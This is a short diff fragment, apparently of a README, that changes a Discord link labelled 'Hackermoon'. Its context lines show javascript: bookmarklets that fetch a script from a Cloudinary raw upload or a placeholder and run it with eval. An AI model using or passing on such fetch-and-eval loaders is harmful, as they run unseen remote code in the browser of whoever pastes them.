@@ -9,4 +9,4 @@ javascript:fetch("https://res.cloudinary.com/dctxcezsd/raw/upload/v1745012111/sa
 javascript:fetch("TESTES").then(t=>t.text()).then(eval);
 ```
 
-### Discord: hackermoon
+### [Discord: Hackermoon](https://discord.gg/k5BFyvbj)
